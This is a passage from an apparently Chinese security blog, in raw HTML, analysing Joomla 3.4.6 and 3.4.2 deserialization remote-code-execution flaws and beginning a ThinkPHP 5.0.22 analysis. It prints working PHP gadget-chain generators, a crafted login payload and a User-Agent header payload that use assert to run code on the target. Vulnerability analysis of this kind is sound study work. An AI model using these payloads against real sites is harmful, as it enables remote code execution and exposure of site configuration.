mathnormal mtight\" style=\"margin-right:0.10764em;\">f</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">n</span><span class=\"mord\"><span class=\"mord mathnormal\">c</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">a</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mopen\">(</span></span></span></span>h, array(&amp;this)); 方法对disconnectHandlers数组中的每个值，都会执行call_user_func_array()，并将&this 作为参数引用，但是不能控制参数，所以不能直接构造 assert+eval 来执行任意代码。</p>\n<p>继续往下看发现在 libraries\\simplepie\\simplepie.php 中有一处 call_user_func 方法调用</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201031171046685-27582232.png\" alt=\"img\"></p>\n<p>这个 call_user_func ($this-&gt;cache_name_function, <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mo>−</mo><mo>&gt;</mo><mi>f</mi><mi>e</mi><mi>e</mi><msub><mi>d</mi><mi>u</mi></msub><mi>r</mi><mi>l</mi><mo stretchy=\"false\">)</mo><mtext>两个参数都是可控的，于是只要满足</mtext></mrow><annotation encoding=\"application/x-tex\">this-&gt;feed_url)两个参数都是可控的，于是只要满足</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.77777em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">s</span><span class=\"mord\">−</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">&gt;</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">e</span><span class=\"mord\"><span class=\"mord mathnormal\">d</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">u</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mclose\">)</span><span class=\"mord cjk_fallback\">两</span><span class=\"mord cjk_fallback\">个</span><span class=\"mord cjk_fallback\">参</span><span class=\"mord cjk_fallback\">数</span><span class=\"mord cjk_fallback\">都</span><span class=\"mord cjk_fallback\">是</span><span class=\"mord cjk_fallback\">可</span><span class=\"mord cjk_fallback\">控</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">于</span><span class=\"mord cjk_fallback\">是</span><span class=\"mord cjk_fallback\">只</span><span class=\"mord cjk_fallback\">要</span><span class=\"mord cjk_fallback\">满</span><span class=\"mord cjk_fallback\">足</span></span></span></span> this-&gt;cache 为 True，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mo>−</mo><mo>&gt;</mo><mi>r</mi><mi>a</mi><msub><mi>w</mi><mi>d</mi></msub><mi>a</mi><mi>t</mi><mi>a</mi><mtext>为</mtext><mi>T</mi><mi>r</mi><mi>u</mi><mi>e</mi><mtext>，</mtext></mrow><annotation encoding=\"application/x-tex\">this-&gt;raw_data为True，</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.77777em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">s</span><span class=\"mord\">−</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">&gt;</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">a</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02691em;\">w</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.33610799999999996em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">d</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">a</span><span class=\"mord cjk_fallback\">为</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">e</span><span class=\"mord cjk_fallback\">，</span></span></span></span>parsed_feed_url [‘scheme’] 不为空就能够 RCE 了，并且 $parsed_feed_url [‘scheme’] 可以能够利用 || $a=‘http//’; 绕过 scheme 的解析</p>\n<p>不过这个 call_user_func 属于 init () 方法，并不属于魔术方法，所以需要结合前面 JDatabaseDriverMysqli 类下的 disconnect () 中的 call_user_func_array 方法实现对 init () 方法的回调。就相当于：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$this-&gt;disconnectHandlers = array(&quot;test&quot;=&gt;array(new SimplePie(),&quot;init&quot;));</span><br></pre></td></tr></table></figure>\n<p>这样的话就相当于实例化了一个 SimplePie 类的对象，并且调用 SimplePie 类下的 init () 方法。</p>\n<p>这里还有一个问题，虽然实例化了一个 SimplePie 的类，但是 SimplePie 类不会自动加载。需要去引入加载类。</p>\n<p>/libraries/legacy/simplepie/factory.php</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201031184225965-1491276190.png\" alt=\"img\"></p>\n<p>发现刚开始就导入了 SimplePie 类，并且 JSimplepieFactory 类属于 autoload，会自动加载，这样的话只需要引入这个类就可以成功加载 SimplePie。</p>\n<p>payload 如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class JSimplepieFactory&#123;&#125;</span><br><span class=\"line\">class JDatabaseDriverMysql&#123;&#125;</span><br><span class=\"line\">class JDatabaseDriverMysqli</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    protected $abc;</span><br><span class=\"line\">    protected $connection;</span><br><span class=\"line\">    protected $disconnectHandlers;</span><br><span class=\"line\">    function __construct()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $this-&gt;abc = new JSimplepieFactory();</span><br><span class=\"line\">        $this-&gt;connection = 1;</span><br><span class=\"line\">        $this-&gt;disconnectHandlers = [</span><br><span class=\"line\">            [new SimplePie, &quot;init&quot;],</span><br><span class=\"line\">        ];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">class SimplePie</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    var $sanitize;</span><br><span class=\"line\">    var $cache_name_function;</span><br><span class=\"line\">    var $feed_url;</span><br><span class=\"line\">    function __construct()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $this-&gt;feed_url = &quot;phpinfo();JFactory::getConfig();exit;&quot;;</span><br><span class=\"line\">        $this-&gt;cache_name_function = &quot;assert&quot;;</span><br><span class=\"line\">        $this-&gt;sanitize = new JDatabaseDriverMysql();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$obj = new JDatabaseDriverMysqli();</span><br><span class=\"line\">$ser = serialize($obj);</span><br><span class=\"line\">echo str_replace(chr(0) . &#x27;*&#x27; . chr(0), &#x27;\\0\\0\\0&#x27;, $ser);?&gt;</span><br></pre></td></tr></table></figure>\n<p>最后构造的账号密码为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">username：\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0</span><br><span class=\"line\">password：123&quot;;s:4:&quot;test&quot;:O:21:&quot;JDatabaseDriverMysqli&quot;:3:&#123;s:6:&quot;\\0\\0\\0abc&quot;;O:17:&quot;JSimplepieFactory&quot;:0:&#123;&#125;s:13:&quot;\\0\\0\\0connection&quot;;i:1;s:21:&quot;\\0\\0\\0disconnectHandlers&quot;;a:1:&#123;i:0;a:2:&#123;i:0;O:9:&quot;SimplePie&quot;:3:&#123;s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:&#123;&#125;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:8:&quot;feed_url&quot;;s:37:&quot;phpinfo();JFactory::getConfig();exit;&quot;;&#125;i:1;s:4:&quot;init&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p>登录时需要登录两次，第一次将他序列化存储进 session 中，第二次将 session 中的值反序列化和我们的输入进行比对，在第二次 rce 产生</p>\n<blockquote>\n<p>最后总结一下：</p>\n<p>1.Joomla 中会把登录的用户名和密码序列化存储进入 session，并且放入数据库中。</p>\n<p>2. 由于 username 和 password 是 protected，因此会有 <code>*N*</code>  的修饰，但数据库中不能存储 <code>N*N</code> （N 为 ASCII 为 0 的字符），因此在序列化入 session 中会将 <code>N*N</code>  替换为 <code>\\0\\0\\0</code> ，在下次和我们输入的用户名密码判断时反序列化，将其变为合规的序列化字符串</p>\n<p>3. 漏洞的关键点在于从 <code>\\0\\0\\0</code>  变为 <code>N*N</code>  时字符变少了三个，我们可以利用变少的三个做变量逃逸，从而覆盖 password</p>\n<p>4. 因此我们的输入用户名时可以自己构造 <code>\\0</code> ，比如我们构造如下用户 <code>\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0</code> ，这样反序列化后多出了 27 个字符把后面的 password 全部吃掉了 <code>s:8:s:&quot;username&quot;;s:54:&quot;\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;</code> ，password 被吃掉后我们就可以构造我们自己的 password，里面的内容为恶意代码，我们接下来要干的事情就是把我们序列化过的恶意代码放入因为逃逸而变为可控变量的 password 中</p>\n<p>5. 然后我们需要找危险函数，来调用，我们在 <code>libraries\\joomla\\database\\driver\\mysqli.php</code>  中找到了 <code>disconnect()</code>  函数，其中调用了 <code>call_user_func_array</code> ，而 mysqli 类中的 <code>__destruct()</code>  会自动调用 <code>disconnect ()</code></p>\n<p>6. 但是 <code>disconnect()</code>  函数中的 <code>call_user_func_array</code>  中的参数我们只能控制第一个参数 <code>$h</code> ，不能直接构造恶意代码</p>\n<p>7. 我们在 <code>libraries\\simplepie\\simplepie.php</code>  中有一个 <code>init()</code>  函数，其中还可以找到一个危险函数 <code>call_user_func</code>  方法调用，并且好消息是他的两个参数 <code>cache_name_function</code>  和 <code>feed_url</code>  我们都可以控制</p>\n<p>8. 但是 <code>init()</code>  不是魔法方法，不会自动调用，我们需要使用一些奇技淫巧调用。即使用刚刚的 <code>disconnect()</code>  函数自动调用 <code>init()</code></p>\n<p>9. 接下来的问题就是我们如何用 <code>disconnect()</code>  中的一个可控参数完成对 <code>init()</code>  的调用。我们使用 <code>call_user_func_array(array(new SimplePie(),&quot;init&quot;))</code>  这样的形式来调用，array 中第一个是我们的类名，第二个是类函数名，而我们不需要 ``call_user_func_array ()` 中的第二个变量</p>\n<p>10. 最后一个问题是 <code>libraries\\simplepie\\simplepie.php</code>  和 <code>libraries\\joomla\\database\\driver\\mysqli.php</code>  是两个不同的 <code>php</code>  文件，如果没有 <code>include()</code>  这类函数的情况下是无法使用隔壁 php 的类的。我们的解决方案是找到一个新的文件 <code>/libraries/legacy/simplepie/factory.php</code> ，其中 <code>jimport(simplepie.simplepie)</code> ，同时 <code>factory.php</code>  中的 <code>JSimplepieFactory</code>  是自动 <code>autoload</code> ，这样我们就能加载 <code>simplepie</code>  类</p>\n<p>11. 由于 <code>session</code>  的存在，我们需要抓包，连续放包两次，第一次将 <code>session</code>  写入数据库中，第二次将我们的输入和数据库中反序列化的 <code>session</code>  比对，一旦反序列化，我们上面构造的恶意 <code>payload</code>  触发，实现 <code>rce</code></p>\n</blockquote>\n<h3 id=\"joomla-342截断反序列化\"><a class=\"markdownIt-Anchor\" href=\"#joomla-342截断反序列化\">#</a> Joomla 3.4.2 截断反序列化</h3>\n<p>这个漏洞和前一个 Joomla3.4.6 反序列化很像，利用了相同的危险函数 <code>libraries\\simplepie\\simplepie.php</code>  中的一个 <code>init()</code>  函数和 <code>libraries\\joomla\\database\\driver\\mysqli.php</code>  中的 <code>disconnect()</code>  函数，并且利用 <code>/libraries/legacy/simplepie/factory.php</code> ，其中 <code>jimport(simplepie.simplepie)</code>  自动加载</p>\n<p>区别在于：</p>\n<blockquote>\n<p>joomla 也没有采用 php 自带的 session 处理机制，而是用多种方式（包括 database、memcache 等）自己编写了存储 session 的容器（storage）。</p>\n<p>其存储格式为『键名 ＋ 竖线 ＋ 经过 serialize () 函数反序列处理的值』，其未正确处理多个竖线的情况。</p>\n<p>那么，我们这里就可以通过注入一个 <code>|</code>  符号，将它前面的部分全部认为是 name，而 | 后面我就可以插入任意 serialize 字符串，构造反序列化漏洞了。</p>\n</blockquote>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/thum-16e81451235948.jpg\" alt=\"14501748976406.jpg\"></p>\n<p>但还有一个问题，在我们构造好的反序列化字符串后面，还有它原本的内容，必须要截断。而此处并不像 SQL 注入，还有注释符可用。</p>\n<p>但不知各位是否还记得当年 wordpress 出过的一个 XSS ( <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5sZWF2ZXNvbmdzLmNvbS9IVE1ML3dvcmRwcmVzcy00LTEtc3RvcmVkLXhzcy5odG1s\">http://www.leavesongs.com/HTML/wordpress-4-1-stored-xss.html</span> )，当时就是在插入数据库的时候利用 &quot;𝌆&quot;（% F0%9D%8C%86）字符将 utf-8 的字段截断了。</p>\n<p>这里我们用同样的方法，在 session 进入数据库的时候就截断后面的内容，避免对我们反序列化过程造成影响。</p>\n<p>在 php5.6.13 以前的版本里，php 在获取 session 字符串以后，就开始查找第一个 |，然后用这个 | 将字符串分割成『键名』和『键值』。<br>\n用 unserialize 解析键值，解析结果作为 session。</p>\n<p>但如果这个 unserialize 解析失败，就放弃这次解析。找到下一个 |，再根据这个 | 将字符串分割成两部分，执行同样的操作，直到解析成功。</p>\n<p>所以，这个 joomla 漏洞的核心内容就是：我们通过𝌆字符， 将原本的 session 截断了，结果因为长度不对所以第一次解析 | 失败，才轮到第二次解析我传入的 |，最后成功利用。</p>\n<p>所以，构造 session 出错，是这个漏洞成立的核心。</p>\n<p>我们可以用长字符（64k）串截断，来达成类似和𝌆字符截断一样的效果。</p>\n<p>我们最终的 exp 为</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//header(&quot;Content-Type: text/plain&quot;);</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">JSimplepieFactory</span> </span>&#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">JDatabaseDriverMysql</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SimplePie</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> <span class=\"variable\">$sanitize</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> <span class=\"variable\">$cache</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> <span class=\"variable\">$cache_name_function</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> <span class=\"variable\">$javascript</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> <span class=\"variable\">$feed_url</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;feed_url = <span class=\"string\">&quot;phpinfo();JFactory::getConfig();exit;&quot;</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;javascript = <span class=\"number\">9999</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;cache_name_function = <span class=\"string\">&quot;assert&quot;</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;sanitize = <span class=\"keyword\">new</span> <span class=\"title class_\">JDatabaseDriverMysql</span>();</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;cache = <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">JDatabaseDriverMysqli</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$a</span>;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$disconnectHandlers</span>;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$connection</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;a = <span class=\"keyword\">new</span> <span class=\"title class_\">JSimplepieFactory</span>();</span><br><span class=\"line\">        <span class=\"variable\">$x</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">SimplePie</span>();</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;connection = <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;disconnectHandlers = [</span><br><span class=\"line\">            [<span class=\"variable\">$x</span>, <span class=\"string\">&quot;init&quot;</span>],</span><br><span class=\"line\">        ];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">JDatabaseDriverMysqli</span>();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>); </span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://www.leavesongs.com/content/uploadfile/201512/thum-46141451235941.jpg\" alt=\"14501734764205.jpg\"></p>\n<p>将这个代码生成的 exp，以前面提到的注入『|』的变换方式，带入前面提到的 user-agent 中，即可触发代码执行。</p>\n<p>其中，我们需要将 <code>char(0)*char(0)</code>  替换成 \\0\\0\\0，因为在序列化的时候，protected 类型变量会被转换成 <code>\\0*\\0name</code>  的样式，这个替换在源代码中也可以看到：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$result = str_replace(&#x27;\\0\\0\\0&#x27;, chr(0) . &#x27;*&#x27; . chr(0), $result); </span><br></pre></td></tr></table></figure>\n<p>给出我最终构造的 POC（既是上述 php 代码生成的 POC）：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">User-Agent: 123&#125;__test|O:21:&quot;JDatabaseDriverMysqli&quot;:3:&#123;s:4:&quot;\\0\\0\\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:&#123;&#125;s:21:&quot;\\0\\0\\0disconnectHandlers&quot;;a:1:&#123;i:0;a:2:&#123;i:0;O:9:&quot;SimplePie&quot;:5:&#123;s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:&#123;&#125;s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:37:&quot;phpinfo();JFactory::getConfig();exit;&quot;;&#125;i:1;s:4:&quot;init&quot;;&#125;&#125;s:13:&quot;\\0\\0\\0connection&quot;;i:1;&#125;ð</span><br><span class=\"line\"></span><br><span class=\"line\">//简单分析一下，123&#125;是为了将前一个解析失败的键值对闭合,__是他的命名规范,后面使我们的恶意代码</span><br></pre></td></tr></table></figure>\n<p>我们再再再总结一下:</p>\n<blockquote>\n<p>1. 由于 Joomla 自定义 session 存储格式为『键名 ＋ 竖线 ＋ 经过 serialize () 函数反序列处理的值』，其未正确处理多个竖线的情况。而 php 5.6.13 以前在获取 session 字符串以后，就开始查找第一个 |，然后用这个 | 将字符串分割成『键名』和『键值』。用 unserialize 解析键值，解析结果作为 session。但如果这个 unserialize 解析失败，就放弃这次解析。找到下一个 |，再根据这个 | 将字符串分割成两部分，执行同样的操作，直到解析成功。</p>\n<p>2. 我们利用（1）可以构造出我们自己的恶意代码的 payload，但是为什么要放在 User-agent 中捏？看图</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221115162408024.png\" alt=\"image-20221115162408024\" style=\"zoom: 50%;\" />\n<p>因为 libraries/joomla/session/session.php 中，_validate 函数，将 ua 和 xff 调用 set 方法设置到了 session 中（session.client.browser 和 session.client.forwarded），并且这两个参数使我们可控的</p>\n<p>3. 为什么 exp 要按照上面的写捏，因为他除了截断和利用方式有所不同之外，触发函数都是相同滴</p>\n<p>4. 那么有人又要问，那么后面多出来的 session 咋办捏，他原来 session 后面还有 cookie 等字段。但我们使用四字节截断了，后面的东西都没啦，就是上面的那坨 ð</p>\n<p>5. 利用时我们仍需要进行两次发包，第一次不携带 cookie 和 User-agent，作用是将 cookie 存储进入数据库。第二次的 cookie 为第一个返回包中的 cookie，User-agent 为我们构造的恶意 payload，第二次发包时从数据库读取 session，造成 rce</p>\n</blockquote>\n<h3 id=\"thinkphp-5022-rce\"><a class=\"markdownIt-Anchor\" href=\"#thinkphp-5022-rce\">#</a> Thinkphp 5.0.22 RCE</h3>\n<p>这里将 Thinkphp5.0.22 解包之后可以看到如下目录结构：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201104235402918-1496995877.png\" alt=\"img\"></p>\n<p>根据类的命名空间可以快速定位文件位置，在 ThinkPHP5.0 的规范里面，命名空间其实对应了文件的所在目录，app 命名空间通常代表了文件的起始目录为 application，而 think 命名空间则代表了文件的其实目录为 thinkphp/library/think，后面的命名空间则表示从起始目录开始的子目录，如下图所示：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201104235944649-946485747.png\" alt=\"img\"></p>\n<p>Thinkphp 执行过程：</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221120151418540.png\" alt=\"image-20221120151418540\" style=\"zoom:67%;\" />\n<p>在具体分析流程前传参方式，首先介绍一下模块等参数</p>\n<ul>\n<li>模块 : application\\index，这个 index 就是一个模块，负责前台相关</li>\n<li>控制器：在模块中的文件夹 controller，即为控制器，负责业务逻辑</li>\n<li>操作：在控制器中定义的方法，比如在默认文件夹中 application\\index\\controller\\Index.php 中就有两个方法，index 和 hello</li>\n<li>参数：就是定义的操作需要传的参数</li>\n</ul>\n<p>在本文中会用到两种传参方式，其他的方式可以自行了解</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. PATH_INFO模式 : http://127.0.0.1/public/index.php/模块/控制器/操作/(参数名)/(参数值)...</span><br><span class=\"line\">2. 兼容模式 : http://127.0.0.1/public/index.php?s=/模块/控制器/操作&amp;(参数名)=(参数值)...</span><br></pre></td></tr></table></figure>\n<p>如果直接访问入口文件 index.php 的话，由于 URL 中没有模块、控制器和操作，因此系统会访问默认模块（index）下面的默认控制器（Index）的默认操作（index），因此下面的访问是等效的：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/thinkphp_5.0.22/public/index.php</span><br><span class=\"line\">http://127.0.0.1/thinkphp_5.0.22/public/index.php/index/index/index</span><br></pre></td></tr></table></figure>\n<p>在 application\\index\\controller 目录下新建一个 Test.php，我们访问下面链接即可访问到 Test 控制器下的 hello 方法：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/thinkphp_5.0.22/public/index.php/index/test/hello/name/bmjoker</span><br></pre></td></tr></table></figure>\n<p><strong>漏洞分析</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload：</span><br><span 